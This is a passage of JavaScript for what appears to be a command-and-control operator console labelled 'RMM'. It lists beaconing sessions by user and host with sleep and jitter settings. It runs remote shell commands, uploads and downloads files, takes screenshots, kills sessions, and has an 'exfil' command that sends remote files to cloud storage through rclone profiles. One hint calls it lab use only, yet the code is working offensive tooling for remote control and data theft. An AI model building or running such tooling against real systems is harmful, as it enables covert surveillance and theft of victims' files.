// --- Shell history & Tab completion (tech plan §4) ---

function loadShellHistoryStore() {
  try {
    return JSON.parse(sessionStorage.getItem(SHELL_HISTORY_KEY) || "{}");
  } catch {
    return {};
  }
}

function saveShellHistoryStore(store) {
  try {
    sessionStorage.setItem(SHELL_HISTORY_KEY, JSON.stringify(store));
  } catch {
    /* quota */
  }
}

function getShellHistoryList(sessionId = state.selectedId) {
  if (!sessionId) return [];
  if (!state.shellHistoryBySession[sessionId]) {
    const store = loadShellHistoryStore();
    state.shellHistoryBySession[sessionId] = Array.isArray(store[sessionId])
      ? store[sessionId].slice(-SHELL_HISTORY_MAX)
      : [];
  }
  return state.shellHistoryBySession[sessionId];
}

function persistShellHistory(sessionId = state.selectedId) {
  if (!sessionId) return;
  const store = loadShellHistoryStore();
  store[sessionId] = getShellHistoryList(sessionId).slice(-SHELL_HISTORY_MAX);
  saveShellHistoryStore(store);
}

function rememberShellCommand(cmd, sessionId = state.selectedId) {
  const text = String(cmd || "").trim();
  if (!sessionId || !text) return;
  const list = getShellHistoryList(sessionId);
  if (list.length && list[list.length - 1] === text) return;
  list.push(text);
  while (list.length > SHELL_HISTORY_MAX) list.shift();
  persistShellHistory(sessionId);
}

function extractShellCommandFromEvent(ev) {
  if (!ev) return null;
  const t = ev.type || "";
  if (t === "operator") {
    const cmd = operatorCommandFromBody(String(ev.body || ""));
    if (!cmd || cmd.startsWith("__")) return null;
    return cmd;
  }
  if (t === "output") {
    const cmd = String(ev.command || "").trim();
    if (cmd && !cmd.startsWith("__")) return cmd;
  }
  return null;
}

function mergeShellHistoryLists(stored, fromEvents) {
  const out = Array.isArray(stored) ? [...stored] : [];
  for (const cmd of fromEvents || []) {
    if (!cmd) continue;
    if (out.length && out[out.length - 1] === cmd) continue;
    out.push(cmd);
  }
  return out.slice(-SHELL_HISTORY_MAX);
}

function rebuildShellHistoryFromEvents(events) {
  const list = [];
  for (const ev of events || []) {
    const cmd = extractShellCommandFromEvent(ev);
    if (!cmd) continue;
    if (list.length && list[list.length - 1] === cmd) continue;
    list.push(cmd);
  }
  return list;
}

function seedShellHistory(sessionId, events) {
  if (!sessionId) return;
  const fromEvents = rebuildShellHistoryFromEvents(events);
  const stored = loadShellHistoryStore()[sessionId];
  state.shellHistoryBySession[sessionId] = mergeShellHistoryLists(stored, fromEvents);
  persistShellHistory(sessionId);
  resetShellHistoryNav();
}

function resetShellHistoryNav() {
  state.shellHistoryNav = { index: -1, draft: "" };
  resetShellTabCycle();
}

function resetShellTabCycle() {
  state.shellTabCycle = { anchor: null, candidates: [], index: -1 };
}

function shellHistoryRelativeIndex(navIndex, len) {
  if (len === 0) return -1;
  if (navIndex < 0) return -1;
  return len - 1 - navIndex;
}

function navigateShellHistory(direction) {
  const input = $("#shell-input");
  if (!input || input.disabled || state.viewMode === "history") return false;
  const list = getShellHistoryList();
  if (!list.length) return false;

  const nav = state.shellHistoryNav;
  if (nav.index === -1) {
    nav.draft = input.value;
  }

  if (direction < 0) {
    if (nav.index < list.length - 1) nav.index += 1;
  } else if (nav.index > -1) {
    nav.index -= 1;
  } else {
    return true;
  }

  resetShellTabCycle();
  if (nav.index === -1) {
    input.value = nav.draft;
  } else {
    const idx = shellHistoryRelativeIndex(nav.index, list.length);
    input.value = list[idx] ?? "";
  }
  updateShellCompletionHint();
  return true;
}

function longestCommonPrefix(strings) {
  if (!strings.length) return "";
  let prefix = strings[0];
  for (let i = 1; i < strings.length; i += 1) {
    const s = strings[i];
    let j = 0;
    const max = Math.min(prefix.length, s.length);
    while (j < max && prefix[j].toLowerCase() === s[j].toLowerCase()) j += 1;
    prefix = prefix.slice(0, j);
    if (!prefix.length) break;
  }
  return prefix;
}

function getShellCompletionCandidates(line) {
  const q = String(line ?? "");
  const lower = q.toLowerCase();
  const seen = new Set();
  const cands = [];

  const add = (s) => {
    const t = String(s);
    if (!t || seen.has(t)) return;
    if (q && !t.toLowerCase().startsWith(lower)) return;
    seen.add(t);
    cands.push(t);
  };

  const history = getShellHistoryList();
  for (let i = history.length - 1; i >= 0; i -= 1) {
    add(history[i]);
  }
  for (const p of SHELL_DISPATCH_PREFIXES) {
    add(p);
  }
  for (const cmd of SHELL_META_COMMANDS) {
    add(cmd);
  }

  cands.sort((a, b) => {
    const aHist = history.includes(a);
    const bHist = history.includes(b);
    if (aHist !== bHist) return aHist ? -1 : 1;
    return a.localeCompare(b, undefined, { sensitivity: "base" });
  });
  return cands;
}

function applyShellTabCompletion(shift) {
  const input = $("#shell-input");
  if (!input || input.disabled || state.viewMode === "history") return;
  const line = input.value;
  let cands = getShellCompletionCandidates(line);
  if (!cands.length) return;

  const cycle = state.shellTabCycle;
  if (cycle.anchor !== line) {
    cycle.anchor = line;
    cycle.candidates = cands;
    cycle.index = -1;
  } else {
    cands = cycle.candidates;
  }

  if (cands.length === 1) {
    input.value = cands[0];
    cycle.anchor = cands[0];
    cycle.index = 0;
    updateShellCompletionHint();
    return;
  }

  const lcp = longestCommonPrefix(cands, line);
  if (cycle.index < 0 && lcp.length > line.length) {
    input.value = lcp;
    cycle.anchor = lcp;
    updateShellCompletionHint();
    return;
  }

  let next = cycle.index + (shift ? -1 : 1);
  if (next < 0) next = cands.length - 1;
  if (next >= cands.length) next = 0;
  cycle.index = next;
  input.value = cands[next];
  cycle.anchor = cands[next];
  updateShellCompletionHint();
}

function updateShellCompletionHint() {
  const hint = $("#shell-completion-hint");
  const input = $("#shell-input");
  if (!hint || !input || input.disabled) {
    if (hint) hint.classList.add("hidden");
    return;
  }
  const line = input.value;
  const cands = getShellCompletionCandidates(line);
  if (!line || !cands.length) {
    hint.textContent = "";
    hint.classList.add("hidden");
    return;
  }
  const best = cands.find(
    (c) => c.toLowerCase().startsWith(line.toLowerCase()) && c.length > line.length
  );
  if (best) {
    hint.textContent = best;
    hint.classList.remove("hidden");
  } else if (cands.length > 1) {
    hint.textContent = `${cands.length} matches — Tab to cycle`;
    hint.classList.remove("hidden");
  } else {
    hint.textContent = "";
    hint.classList.add("hidden");
  }
}

function handleShellInputKeydown(e) {
  if (e.key === "Enter" && e.ctrlKey) {
    e.preventDefault();
    runCommand(false);
    return;
  }
  if (e.key === "ArrowUp") {
    e.preventDefault();
    if (navigateShellHistory(-1)) return;
  }
  if (e.key === "ArrowDown") {
    e.preventDefault();
    if (navigateShellHistory(1)) return;
  }
  if (e.key === "Tab") {
    e.preventDefault();
    applyShellTabCompletion(e.shiftKey);
  }
}

let shellInputProgrammatic = false;

function bindShellInputCompletion() {
  const input = $("#shell-input");
  if (!input || input.dataset.completionBound) return;
  input.dataset.completionBound = "1";
  input.addEventListener("keydown", handleShellInputKeydown);
  input.addEventListener("input", () => {
    if (shellInputProgrammatic) return;
    resetShellHistoryNav();
    resetShellTabCycle();
    updateShellCompletionHint();
  });
}

function appendShellOutput(text) {
  if (!text) {
    appendShellLine("meta", "(no output)");
    return;
  }
  for (const line of String(text).split("\n")) {
    appendShellLine("output", escapeHtml(line));
  }
}

function appendShellMeta(text) {
  appendShellLine("meta", escapeHtml(text));
}

function appendShellError(text) {
  appendShellLine("error", escapeHtml(text));
}

function operatorCommandFromBody(body) {
  const b = String(body || "").trim();
  const idx = b.indexOf(":");
  if (idx === -1) return "";
  return b.slice(idx + 1).trim();
}

function renderEventBodyHtml(ev) {
  const body = String(ev.body || "");
  if (ev.type === "screenshot" && ev.artifact_url) {
    const src = artifactSrc(ev.artifact_url);
    return `<img class="screenshot-preview" src="${escapeHtml(src)}" alt="screenshot">`;
  }
  if (ev.type === "file_upload" && ev.artifact_url) {
    fetchSessionDownloads().catch(() => {});
    const name = suggestedDownloadFilename({ remote_path: body.split(" → ")[0], artifact: ev.artifact });
    return `${escapeHtml(body)}<br><a class="artifact-link artifact-download" href="#" data-artifact-url="${escapeHtml(ev.artifact_url)}" data-download-name="${escapeHtml(name)}">Download file</a>`;
  }
  if (ev.type === "cloud_upload") {
    return renderCloudUploadHtml(ev);
  }
  if (ev.artifact_url) {
    const src = artifactSrc(ev.artifact_url);
    return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(src)}" target="_blank" rel="noopener">Open artifact</a>`;
  }
  return escapeHtml(body);
}

// --- Views ---

function showLogin(err = "") {
  hide($("#app"));
  show($("#login"));
  const errEl = $("#login-error");
  errEl.textContent = err;
  errEl.classList.toggle("hidden", !err);
}

function initSidebarResize() {
  const body = $("#app-body");
  const resizer = $("#sidebar-resizer");
  if (!body || !resizer) return;

  const STORAGE_KEY = "rmm_sidebar_width";
  const MIN = 200;
  const MAX = 560;

  function maxWidth() {
    return Math.min(MAX, Math.floor(window.innerWidth * 0.5));
  }

  function currentWidth() {
    return parseInt(getComputedStyle(body).getPropertyValue("--sidebar-width"), 10) || 280;
  }

  function setWidth(px) {
    const w = Math.min(maxWidth(), Math.max(MIN, px));
    body.style.setProperty("--sidebar-width", `${w}px`);
    resizer.setAttribute("aria-valuenow", String(w));
    sessionStorage.setItem(STORAGE_KEY, String(w));
  }

  const saved = parseInt(sessionStorage.getItem(STORAGE_KEY), 10);
  if (!Number.isNaN(saved)) {
    setWidth(saved);
  } else {
    resizer.setAttribute("aria-valuenow", String(currentWidth()));
  }

  let startX = 0;
  let startW = 0;

  function onPointerMove(e) {
    setWidth(startW + (e.clientX - startX));
  }

  function stopDrag() {
    document.body.classList.remove("sidebar-resizing");
    resizer.classList.remove("dragging");
    document.removeEventListener("pointermove", onPointerMove);
    document.removeEventListener("pointerup", stopDrag);
    document.removeEventListener("pointercancel", stopDrag);
  }

  resizer.addEventListener("pointerdown", (e) => {
    if (window.matchMedia("(max-width: 768px)").matches) return;
    e.preventDefault();
    startX = e.clientX;
    startW = currentWidth();
    document.body.classList.add("sidebar-resizing");
    resizer.classList.add("dragging");
    document.addEventListener("pointermove", onPointerMove);
    document.addEventListener("pointerup", stopDrag);
    document.addEventListener("pointercancel", stopDrag);
  });

  resizer.addEventListener("keydown", (e) => {
    if (window.matchMedia("(max-width: 768px)").matches) return;
    const step = e.shiftKey ? 40 : 10;
    const cur = currentWidth();
    if (e.key === "ArrowLeft") {
      e.preventDefault();
      setWidth(cur - step);
    } else if (e.key === "ArrowRight") {
      e.preventDefault();
      setWidth(cur + step);
    } else if (e.key === "Home") {
      e.preventDefault();
      setWidth(MIN);
    } else if (e.key === "End") {
      e.preventDefault();
      setWidth(maxWidth());
    }
  });

  window.addEventListener("resize", () => {
    if (currentWidth() > maxWidth()) {
      setWidth(maxWidth());
    }
  });
}

function showApp() {
  hide($("#login"));
  show($("#app"));
}

async function connect() {
  const token = $("#token-input").value.trim();
  state.token = token;
  const { status, data } = await api("/health");
  if (status === 401) {
    showLogin("Invalid API token");
    return;
  }
  if (status !== 200) {
    showLogin(data.detail || data.error || `Health check failed (${status})`);
    return;
  }
  sessionStorage.setItem(STORAGE_KEY, token);
  showApp();
  if (typeof window.refreshAgentScriptTemplate === "function") {
    window.refreshAgentScriptTemplate();
  }
  connectWebSocket();
  startEventPolling();
  startSessionPolling();
  startStatusTick();
  await refreshSessions();
  await fetchSessionHistory();
  await refreshExfilStatus();
}

function disconnect() {
  disconnectWebSocket();
  stopEventPolling();
  stopSessionPolling();
  stopStatusTick();
  sessionStorage.removeItem(STORAGE_KEY);
  state.token = "";
  state.selectedId = null;
  state.echoedCommands.clear();
  showLogin();
}

async function refreshSessions() {
  const { status, data } = await api("/sessions");
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  applySessionsUpdate(data.sessions || []);
}

function renderSessionList() {
  const ul = $("#session-list");
  ul.innerHTML = "";
  for (const s of state.sessions) {
    const li = document.createElement("li");
    li.className =
      "session-item" +
      (s.id === state.selectedId && state.viewMode === "live" ? " active" : "");
    const agoSec = sessionAgoSeconds(s);
    const ago = agoSec != null ? formatAgo(agoSec) : formatTime(s.last_seen);
    const st = computeBeaconStatus(s);
    const connected = formatFirstConnected(s.first_seen);
    li.innerHTML = `
      <div class="id">${escapeHtml(s.id.slice(0, 8))} <span class="beacon-status ${statusClass(st)}">${escapeHtml(st)}</span></div>
      <div class="meta">${escapeHtml(s.username)}@${escapeHtml(s.hostname)}</div>
      ${connected ? `<div class="sub sub-connected">connected ${escapeHtml(connected)}</div>` : ""}
      <div class="sub">sleep ${s.sleep_seconds}s · jitter ${s.jitter_percent}% · ${escapeHtml(ago)}</div>
    `;

    const actions = document.createElement("div");
    actions.className = "session-item-actions";

    const configBtn = document.createElement("button");
    configBtn.type = "button";
    configBtn.className = "session-beacon secondary";
    configBtn.title = "Edit beacon sleep and jitter";
    configBtn.setAttribute("aria-label", "Beacon config");
    configBtn.textContent = "Beacon";
    configBtn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      openBeaconConfigDialog(s.id);
    });

    const killBtn = document.createElement("button");
    killBtn.type = "button";
    killBtn.className = "session-kill danger";
    killBtn.title = "Kill session (remote client exits on next beacon)";
    killBtn.setAttribute("aria-label", "Kill session");
    killBtn.textContent = "Kill";
    killBtn.addEventListener("click", (e) => {
      e.preventDefault();
      e.stopPropagation();
      killSession(s.id);
    });

    actions.appendChild(configBtn);
    actions.appendChild(killBtn);
    li.appendChild(actions);

    li.addEventListener("click", () => selectSession(s.id));
    ul.appendChild(li);
  }
}

async function selectSession(id) {
  state.viewMode = "live";
  state.selectedHistoryId = null;
  setConsoleReadOnly(false);
  renderHistoryList();
  state.selectedId = id;
  state.lastEventId = 0;
  state.echoedCommands.clear();
  state.pendingCommandBlocks = [];
  renderSessionList();
  const s = state.sessions.find((x) => x.id === id);
  if (!s) return;

  hide($("#empty-state"));
  show($("#console-panel"));

  $("#console-title").textContent = `${s.username}@${s.hostname}`;
  $("#console-detail").textContent = `${s.id} · last seen ${formatTime(s.last_seen)}`;
  shellOutputEl().innerHTML = "";
  updateShellPrompt();
  appendShellMeta(`Session ${id.slice(0, 8)} — Enter wait · Ctrl+Enter queue · ↑↓ history · Tab complete`);

  const input = $("#shell-input");
  input.value = "";
  input.disabled = false;
  input.focus();

  connectWebSocket();
  wsSubscribe(id);
  startEventPolling();

  const { status, data } = await api(
    `/sessions/${encodeURIComponent(id)}/events?since=0&limit=500`
  );
  if (status === 200) {
    const events = (data.events || []).sort((a, b) => (a.id || 0) - (b.id || 0));
    seedShellHistory(id, events);
    for (const ev of events) {
      appendEvent(ev, { history: true });
    }
    if (events.length) {
      state.lastEventId = events.reduce((m, e) => Math.max(m, e.id || 0), 0);
      saveEventCursor(id, state.lastEventId);
    }
  }
  await fetchSessionDownloads();
}

function showEmptyConsole() {
  state.selectedId = null;
  state.selectedHistoryId = null;
  state.viewMode = "live";
  setConsoleReadOnly(false);
  show($("#empty-state"));
  hide($("#console-panel"));
  $("#shell-input").value = "";
  const dl = $("#downloads-list");
  if (dl) {
    dl.innerHTML = '<p class="downloads-empty">No files downloaded yet.</p>';
  }
  renderSessionList();
  updateShellPrompt();
  connectWebSocket();
}

function loadEventCursors() {
  try {
    return JSON.parse(sessionStorage.getItem(EVENT_CURSORS_KEY) || "{}");
  } catch {
    return {};
  }
}

function saveEventCursor(sessionId, eventId) {
  if (!sessionId || typeof eventId !== "number") return;
  const cursors = loadEventCursors();
  cursors[sessionId] = Math.max(cursors[sessionId] || 0, eventId);
  sessionStorage.setItem(EVENT_CURSORS_KEY, JSON.stringify(cursors));
}

function appendEvent(ev, { local = false, history = false } = {}) {
  if (!local) {
    if (typeof ev.id === "number" && ev.id <= state.lastEventId) return;
    if (typeof ev.id === "number") {
      state.lastEventId = Math.max(state.lastEventId, ev.id);
      if (state.selectedId) {
        saveEventCursor(state.selectedId, state.lastEventId);
      }
    }
  }

  const evType = ev.type || "output";
  const body = String(ev.body || "").trim();
  if (evType === "operator") {
    const opCmd = operatorCommandFromBody(body);
    if (history && opCmd) {
      const kind = historyOperatorKind(body);
      const meta = historyOperatorMeta(body);
      const remotePath = historyRemoteFromOperatorCmd(opCmd, kind);
      const matchKeys = [opCmd];
      if (kind === "download") matchKeys.push(`download ${remotePath}`);
      if (kind === "exfil") matchKeys.push(`exfil ${remotePath}`);
      createCommandBlock(opCmd, { meta, kind, remotePath, matchKeys });
      return;
    }
    if (!history && opCmd && state.echoedCommands.has(opCmd)) {
      return;
    }
    const label = body || "operator action";
    appendShellLine("operator", escapeHtml(label));
    return;
  }

  if (evType === "exfil_progress") {
    const block = findExfilProgressBlock(ev);
    if (block) {
      updateExfilProgressBlock(block, ev);
    }
    return;
  }

  if (evType === "download_progress") {
    const block = findDownloadProgressBlock(ev);
    if (block) {
      updateDownloadProgressBlock(block, ev);
    }
    return;
  }

  const resultTypes = new Set([
    "output",
    "file_upload",
    "cloud_upload",
    "screenshot",
  ]);
  if (resultTypes.has(evType)) {
    const block = findPendingCommandBlock(ev);
    if (block && fillCommandBlock(block, ev)) {
      return;
    }
    appendUnmatchedEvent(ev);
    return;
  }

  appendUnmatchedEvent(ev);
}

function clearShellInput() {
  const input = $("#shell-input");
  shellInputProgrammatic = true;
  input.value = "";
  shellInputProgrammatic = false;
  resetShellHistoryNav();
  updateShellCompletionHint();
  input.blur();
  input.focus();
}

function parseShellWords(line) {
  const words = [];
  let cur = "";
  let quote = null;
  for (let i = 0; i < line.length; i += 1) {
    const c = line[i];
    if (quote) {
      if (c === quote) {
        quote = null;
      } else if (c === "\\" && quote === '"' && i + 1 < line.length) {
        cur += line[++i];
      } else {
        cur += c;
      }
      continue;
    }
    if (c === '"' || c === "'") {
      quote = c;
      continue;
    }
    if (/\s/.test(c)) {
      if (cur) {
        words.push(cur);
        cur = "";
      }
      continue;
    }
    cur += c;
  }
  if (cur) words.push(cur);
  return words;
}

function defaultExfilProfile() {
  const select = $("#exfil-profile");
  if (select && !select.disabled && select.value.trim()) {
    return select.value.trim();
  }
  return state.rcloneDefaultProfile || "";
}

function parseExfilShellArgs(rest) {
  if (!rest.length) {
    return { error: "Usage: exfil <remote_path> [profile]" };
  }
  let remote = rest[0];
  let profile = "";
  const profileFlag = rest.indexOf("--profile");
  if (profileFlag >= 0) {
    if (profileFlag === 0 || profileFlag >= rest.length - 1) {
      return { error: "Usage: exfil <remote_path> [profile]" };
    }
    remote = rest.slice(0, profileFlag).join(" ");
    profile = rest[profileFlag + 1];
  } else if (rest.length === 2) {
    profile = rest[1];
  } else if (rest.length > 2) {
    return { error: "Usage: exfil <remote_path> [profile]" };
  }
  if (!profile) {
    profile = defaultExfilProfile();
  }
  if (!profile) {
    return {
      error:
        "No rclone profile — pick one in the Exfil panel or pass a profile name",
    };
  }
  return { remote, profile };
}

async function postDownloadQueue(remote) {
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/download`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ remote_path: remote }),
    }
  );
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
    return false;
  }
  pollSessionEvents().catch(() => {});
  return true;
}

async function postExfilQueue(remote, profile) {
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/exfil`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ remote_path: remote, profile }),
    }
  );
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
    return false;
  }
  pollSessionEvents().catch(() => {});
  return true;
}

async function postScreenshotQueue() {
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/screenshot`,
    { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }
  );
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
    return false;
  }
  pollSessionEvents().catch(() => {});
  return true;
}

/** @returns {boolean} true if cmd was a meta command (handled locally). */
async function dispatchShellMetaCommand(cmd) {
  const words = parseShellWords(cmd);
  if (!words.length) return false;
  const verb = words[0].toLowerCase();
  const rest = words.slice(1);

  if (verb === "download") {
    if (!rest.length) {
      appendShellError("Usage: download <remote_path>");
      return true;
    }
    const remote = rest.join(" ");
    appendShellEcho(`download ${remote}`, {
      block: true,
      kind: "download",
      remotePath: remote,
      meta: "(download queued)",
      matchKeys: [`download ${remote}`, `__DOWNLOAD__ ${remote}`],
    });
    await postDownloadQueue(remote);
    return true;
  }

  if (verb === "exfil") {
    const parsed = parseExfilShellArgs(rest);
    if (parsed.error) {
      appendShellError(parsed.error);
      return true;
    }
    const { remote, profile } = parsed;
    appendShellEcho(`exfil ${remote} ${profile}`, {
      block: true,
      kind: "exfil",
      remotePath: remote,
      meta: `(exfil queued via ${profile})`,
      matchKeys: [
        `exfil ${remote} ${profile}`,
        `exfil ${remote}`,
        `exfil ${remote} --profile ${profile}`,
      ],
    });
    await postExfilQueue(remote, profile);
    return true;
  }

  if (verb === "screenshot") {
    if (rest.length) {
      appendShellError("Usage: screenshot");
      return true;
    }
    appendShellEcho("screenshot", {
      block: true,
      kind: "screenshot",
      meta: "(screenshot queued)",
      matchKeys: ["screenshot", "__SCREENSHOT__"],
    });
    await postScreenshotQueue();
    return true;
  }

  return false;
}

async function runCommand(wait) {
  const input = $("#shell-input");
  const cmd = input.value.trim();
  if (!cmd || !state.selectedId) return;

  if (await dispatchShellMetaCommand(cmd)) {
    clearShellInput();
    input.focus();
    return;
  }

  clearShellInput();
  appendShellEcho(cmd, {
    block: !wait,
    meta: wait ? null : "(queued — waiting for next beacon)",
  });
  input.disabled = true;

  try {
    if (wait) {
      const { status, data } = await api(
        `/sessions/${encodeURIComponent(state.selectedId)}/exec`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ command: cmd, timeout: 120 }),
        }
      );
      if (status === 408) {
        appendShellError(
          "Timed out — beacon interval may be long; try Ctrl+Enter to queue instead"
        );
      } else if (status === 200 && data.event) {
        appendEvent(data.event);
      } else {
        appendShellError(data.error || `HTTP ${status}`);
      }
    } else {
      const { status, data } = await api(
        `/sessions/${encodeURIComponent(state.selectedId)}/commands`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ command: cmd, type: "oneshot" }),
        }
      );
      if (status === 200) {
        pollSessionEvents().catch(() => {});
      } else {
        appendShellError(data.error || `HTTP ${status}`);
      }
    }
  } finally {
    input.disabled = false;
    clearShellInput();
    input.focus();
  }
}

async function queueDownload() {
  const remote = $("#download-remote").value.trim();
  if (!remote || !state.selectedId) return;
  appendShellEcho(`download ${remote}`, {
    block: true,
    kind: "download",
    remotePath: remote,
    meta: "(download queued)",
    matchKeys: [`download ${remote}`, `__DOWNLOAD__ ${remote}`],
  });
  $("#download-remote").value = "";
  await postDownloadQueue(remote);
}

function formatExfilProfileOption(profile) {
  const name = profile.name || "?";
  const type = profile.type || "?";
  const folder = profile.folder || "/";
  return `${name} (${type}) → ${folder}`;
}

function populateExfilProfiles(data) {
  const select = $("#exfil-profile");
  const btn = $("#btn-exfil");
  if (!select) return;

  select.replaceChildren();
  const profiles = data?.profiles || [];
  const defaultName = data?.default_profile || "";
  state.rcloneDefaultProfile = defaultName;
  const ready = Boolean(data?.rclone_binary) && profiles.length > 0 && !data?.load_error;

  if (!data?.rclone_binary) {
    select.disabled = true;
    const opt = document.createElement("option");
    opt.value = "";
    opt.textContent = "rclone missing";
    select.appendChild(opt);
    if (btn) btn.disabled = true;
    return;
  }

  if (data?.load_error) {
    select.disabled = true;
    const opt = document.createElement("option");
    opt.value = "";
    opt.textContent = "Profile error";
    select.appendChild(opt);
    if (btn) btn.disabled = true;
    return;
  }

  if (!profiles.length) {
    select.disabled = true;
    const opt = document.createElement("option");
    opt.value = "";
    opt.textContent = "No profiles";
    select.appendChild(opt);
    if (btn) btn.disabled = true;
    return;
  }

  for (const profile of profiles) {
    const opt = document.createElement("option");
    opt.value = profile.name || "";
    opt.textContent = formatExfilProfileOption(profile);
    if (profile.name === defaultName) {
      opt.selected = true;
    }
    select.appendChild(opt);
  }

  select.disabled = false;
  if (btn) btn.disabled = !ready;
}

async function refreshExfilStatus() {
  const hint = $("#exfil-status-hint");
  if (!hint) return;
  const { status, data } = await api("/rclone/config");
  if (status !== 200) {
    hint.textContent = "rclone: unable to read server configuration";
    populateExfilProfiles(null);
    return;
  }
  populateExfilProfiles(data);
  if (data.load_error) {
    hint.textContent = `rclone profile error: ${data.load_error}`;
    return;
  }
  if (!data.rclone_binary) {
    hint.textContent =
      "rclone.exe missing on server — place binary in tools/rclone/ (see docs/rclone-exfil.md)";
    return;
  }
  const count = (data.profiles || []).length;
  const maxBytes = Number(data.max_bytes);
  const limit =
    maxBytes === 0 ? "no size cap" : `max ${formatByteSize(maxBytes)} per file`;
  if (!count) {
    hint.textContent =
      "No rclone profiles — set RMM_RCLONE_PROFILES or RMM_RCLONE_PROFILES_FILE on the server";
    return;
  }
  hint.textContent = `rclone ready · ${count} profile${count === 1 ? "" : "s"} · ${limit} · default ${data.default_profile || "—"} (lab use only)`;
}

async function queueExfil() {
  const remote = $("#exfil-remote").value.trim();
  const profileSelect = $("#exfil-profile");
  const profile = profileSelect && !profileSelect.disabled ? profileSelect.value.trim() : "";
  if (!remote || !state.selectedId || !profile) return;
  appendShellEcho(`exfil ${remote} ${profile}`, {
    block: true,
    kind: "exfil",
    remotePath: remote,
    meta: `(exfil queued via ${profile})`,
    matchKeys: [`exfil ${remote} ${profile}`, `exfil ${remote}`, `exfil ${remote} --profile ${profile}`],
  });
  $("#exfil-remote").value = "";
  await postExfilQueue(remote, profile);
}

async function queueScreenshot() {
  if (!state.selectedId) return;
  appendShellEcho("screenshot", {
    block: true,
    kind: "screenshot",
    meta: "(screenshot queued)",
    matchKeys: ["screenshot", "__SCREENSHOT__"],
  });
  await postScreenshotQueue();
}

async function queueUpload() {
  const fileInput = $("#upload-file");
  const remote = $("#upload-remote").value.trim();
  if (!state.selectedId || !fileInput.files?.length || !remote) return;

  const file = fileInput.files[0];
  appendShellEcho(`upload ${file.name} → ${remote}`, {
    block: true,
    kind: "upload",
    remotePath: remote,
    meta: "(upload queued)",
    matchKeys: [`upload ${file.name} → ${remote}`, `__UPLOAD__ ${remote}`],
  });
  const buf = await file.arrayBuffer();
  const bytes = new Uint8Array(buf);
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  const content_b64 = btoa(binary);

  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/upload`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ remote_path: remote, content_b64 }),
    }
  );
  fileInput.value = "";
  $("#upload-remote").value = "";
  if (status !== 200) {
    appendShellError(data.error || `HTTP ${status}`);
  }
}

async function applyBeaconConfig(sessionId, sleep, jitter) {
  const { status, data } = await api(`/sessions/${encodeURIComponent(sessionId)}/config`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sleep_seconds: sleep, jitter_percent: jitter }),
  });
  if (status !== 200) {
    appendShellError(data.error || `Beacon config failed (${status})`);
    return false;
  }
  if (state.selectedId === sessionId) {
    appendShellMeta(`Beacon config → sleep ${sleep}s, jitter ${jitter}%`);
  }
  await refreshSessions();
  return true;
}

function openBeaconConfigDialog(sessionId) {
  const s = state.sessions.find((x) => x.id === sessionId);
  if (!s) return;
  state.beaconConfigTargetId = sessionId;
  const label = $("#beacon-config-session-label");
  if (label) {
    label.textContent = `${s.username}@${s.hostname} · ${sessionId.slice(0, 8)}`;
  }
  const sleepInput = $("#beacon-config-sleep");
  const jitterInput = $("#beacon-config-jitter");
  if (sleepInput) sleepInput.value = s.sleep_seconds;
  if (jitterInput) jitterInput.value = s.jitter_percent;
  const dialog = $("#beacon-config-dialog");
  if (dialog?.showModal) {
    dialog.showModal();
    sleepInput?.focus();
    sleepInput?.select();
  }
}

function closeBeaconConfigDialog() {
  const dialog = $("#beacon-config-dialog");
  if (dialog?.open) dialog.close();
  state.beaconConfigTargetId = null;
}

async function submitBeaconConfigDialog(e) {
  e.preventDefault();
  const sessionId = state.beaconConfigTargetId;
  if (!sessionId) return;
  const sleep = parseInt($("#beacon-config-sleep")?.value, 10);
  const jitter = parseInt($("#beacon-config-jitter")?.value, 10);
  if (!Number.isFinite(sleep) || sleep < 1 || sleep > 3600) {
    appendShellError("Sleep must be between 1 and 3600 seconds");
    return;
  }
  if (!Number.isFinite(jitter) || jitter < 0 || jitter > 100) {
    appendShellError("Jitter must be between 0 and 100 percent");
    return;
  }
  const ok = await applyBeaconConfig(sessionId, sleep, jitter);
  if (ok) closeBeaconConfigDialog();
}

function bindBeaconConfigDialog() {
  const dialog = $("#beacon-config-dialog");
  const form = $("#beacon-config-form");
  if (!dialog || !form) return;
  form.addEventListener("submit", (e) => {
    submitBeaconConfigDialog(e);
  });
  $("#beacon-config-cancel")?.addEventListener("click", () => {
    closeBeaconConfigDialog();
  });
  dialog.addEventListener("close", () => {
    state.beaconConfigTargetId = null;
  });
  dialog.addEventListener("cancel", () => {
    state.beaconConfigTargetId = null;
  });
}

async function killSession(id) {
  const sessionId = id || state.selectedId;
  if (!sessionId) return;
  const shortId = sessionId.slice(0, 8);
  if (!confirm(`Kill session ${shortId}? The remote client will exit.`)) return;
  const { status } = await api(`/sessions/${encodeURIComponent(sessionId)}`, {
    method: "DELETE",
  });
  if (status === 200) {
    if (state.selectedId === sessionId) {
      showEmptyConsole();
    }
    await refreshSessions();
    await fetchSessionHistory();
  }
}

window.rmmApi = api;
window.rmmState = state;

document.addEventListener("DOMContentLoaded", () => {
  if (typeof window.initAiPanel === "function") {
    window.initAiPanel();
  }
  $("#connect-btn").addEventListener("click", connect);
  $("#token-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") connect();
  });
  $("#disconnect-btn").addEventListener("click", disconnect);
  bindBeaconConfigDialog();
  $("#btn-download").addEventListener("click", queueDownload);
